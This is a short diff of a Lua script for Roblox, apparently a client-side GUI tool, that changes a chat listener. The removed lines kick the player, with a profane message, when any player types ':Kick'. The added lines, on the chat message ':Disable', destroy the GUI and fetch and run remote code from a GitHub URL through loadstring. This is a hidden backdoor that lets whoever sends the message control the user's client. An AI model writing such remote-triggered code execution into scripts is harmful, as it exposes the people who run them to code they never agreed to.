@@ -510,9 +510,11 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
     local player = players:FindFirstChild(message.FromSpeaker)
     local message = message.Message or ""
     if player then
-        if message == ":Kick" then
-            game.Players.LocalPlayer:Kick("You have been kicked by an admin | Reason: fuck you")
-        end
+        if message == ":Disable" then
+             Main:Destroy()
+             _G.NotificationText = "Uh something went wrong - please wait because the owner watching anime"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuttle-r/crap/main/Notification.txt",true))()
+         end
     end
 end)
 
